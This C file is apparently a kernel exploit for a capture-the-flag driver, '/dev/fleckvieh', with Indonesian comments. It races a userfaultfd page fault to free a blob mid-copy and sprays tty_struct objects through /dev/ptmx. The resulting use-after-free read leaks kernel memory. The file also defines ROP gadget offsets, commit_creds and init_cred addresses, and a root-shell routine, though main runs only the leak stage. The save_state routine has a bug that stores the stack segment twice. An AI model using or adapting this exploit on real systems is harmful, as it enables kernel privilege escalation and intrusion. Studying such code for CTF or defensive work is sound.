#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#define ofs_tty_ops 0xc3c3c0
#define addr_modprobe_path (kbase + 0xe37ea0)
#define rop_push_rdx_cmp_eax_415B005Ch_pop_rsp_rbp (kbase + 0x09b13a)
#define rop_pop_rdi (kbase + 0x09b0ed)
#define addr_init_cred (kbase + 0xe37480)
#define addr_commit_creds (kbase + 0x072830)
#define addr_kpti_trampoline (kbase + 0x800e26)
#define ERR(msg)    \
        do{             \
            perror(msg);    \
            exit(EXIT_FAILURE); \
          }while(0)

#define CMD_ADD 0xf1ec0001
#define CMD_DEL 0xf1ec0002
#define CMD_GET 0xf1ec0003
#define CMD_SET 0xf1ec0004

typedef struct {
  int id;
  size_t size;
  char *data;
} request_t;

unsigned long user_cs, user_ss, user_rsp, user_rflags;

static void shell()
{
    char *argv[] = {"/bin/sh",NULL};
    char *envp[] = {NULL};
    puts("ROOOT");
    execve("/bin/sh",argv,envp);
}


static void save_state()
{
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_ss), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}

cpu_set_t pwn_cpu;
int global_fd;

int add(char *data, size_t size)
{
    request_t req = {
        .size = size,
        .data = data
    };
    int r = ioctl(global_fd,CMD_ADD,&req);
    if(r==-1){
        ERR("blob_add");
    }

    return r;
}

int del(int id)
{
    request_t req = {
        .id = id
    };
    int r = ioctl(global_fd,CMD_DEL,&req);
    if(r==-1){
        ERR("blob_del");
    }

    return r;
}

int get(int id, char *data, size_t size)
{
    request_t req = {
        .id = id,
        .data = data,
        .size = size
    };
    int r = ioctl(global_fd,CMD_GET,&req);
    if(r==-1){
        ERR("blob_get");
    }
    return r;
}

int set(int id, char *data, size_t size)
{
    request_t req = {
        .id = id,
        .data = data,
        .size = size
    };
    int r = ioctl(global_fd,CMD_SET,&req);
    if(r==-1){
        ERR("blob_set");
    }

    return r;
}

int victim;
int ptmx[0x10];
char *buf;

static void *fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;
    struct uffdio_copy copy;
    struct pollfd poll_fd;
    long uffd;
    static int fault_count = 0;

    //Menjalankan di CPU yang sama dengan thread utama
    if(sched_setaffinity(0,sizeof(cpu_set_t),&pwn_cpu)){
        ERR("sched_setaffinity");
    }

    uffd = (long)arg;
    poll_fd.fd = uffd;
    poll_fd.events = POLLIN;
    while(poll(&poll_fd,1,-1)>0){
        if(poll_fd.revents & POLLERR || poll_fd.revents & POLLHUP){
            ERR("poll");
        }
        /*Menunggu page fault*/
        if(read(uffd,&msg,sizeof(msg))<=0){
            ERR("read(uffd)");
        }
        assert(msg.event == UFFD_EVENT_PAGEFAULT);
        /*Mengatur data yang akan dikembalikan sebagai halaman yang diminta*/
        switch(fault_count++){
            case 0: {
                puts("[+] UAF read");
                /*blob_get menyebabkan kesalahan halaman
                victim di hapus*/

                del(victim);

                /*melakukan spray pada tty_struct dan menempatkannya di lokasi victim.*/

                int fds[0x10];
                for(int i=0;i<0x10;i++){
                    fds[i] = open("/dev/ptmx" ,O_RDONLY|O_NOCTTY);
                    if(fds[i]==-1){
                        ERR("open(ptmx)");
                    }
                }      
                
                copy.src = (unsigned long)buf;  
                break;        
            }

            case 1: {
                /*Ini adalah buffer yang menyimpan data dari halaman ini 
                (akan ditimpa oleh copy_to_user sehingga tidak penting).*/
                break;
            }
        
        }        
        copy.dst = (unsigned long)msg.arg.pagefault.address;
        copy.len = 0x1000;
        copy.mode = 0;
        copy.copy = 0;

        if(ioctl(uffd,UFFDIO_COPY,&copy)==-1){
            ERR("ioctl(UFFDIO_COPY)");
        }
    }

    return NULL;
}

int register_uffd(void *addr, size_t len) {
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  long uffd;
  pthread_t th;

  /* membuat userfaultfd */
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  if(uffd == -1){
    ERR("userfaultfd");
  }

  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if(ioctl(uffd, UFFDIO_API, &uffdio_api) == -1){
    ERR("ioctl(UFFDIO_API)");
  }

  /* Mendaftarkan halaman ke userfaultfd */
  uffdio_register.range.start = (unsigned long)addr;
  uffdio_register.range.len = len;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1){
    ERR("UFFDIO_REGISTER");
  }
    
  /* Membuat thread untuk menangani page fault */
  if(pthread_create(&th, NULL, fault_handler_thread, (void*)uffd)){
    ERR("pthread_create");
  }
    
  return 0;
}

int main()
{
    /*Pastikan bahwa thread utama dan handler uffd berjalan pada CPU yang sama*/
    CPU_ZERO(&pwn_cpu);
    CPU_SET(0,&pwn_cpu);
    if(sched_setaffinity(0,sizeof(cpu_set_t),&pwn_cpu)){
        ERR("sched_setaffinity");
    }

    global_fd = open("/dev/fleckvieh",O_RDWR);
    if(global_fd==-1){
        ERR("open(fleckveih)");
    }

    void *page;
    page = mmap(NULL,0x2000,PROT_READ|PROT_WRITE,
                MAP_ANONYMOUS|MAP_PRIVATE,-1,0);
    if(page == MAP_FAILED){
        ERR("mmap");
    }            
    register_uffd(page,0x2000);
    buf = (char*)malloc(0x400);

    victim = add("hello",0x400);
    set(victim,"hello",6);
    
    /*UAF read: membocorkan tty_struct*/
    get(victim,page,0x400);
    for(int i=0;i<0x80;i++){
        printf("%d: 0x%16lx\n" ,i,*(unsigned long*)(page + i));
    }

    return EXIT_SUCCESS;
}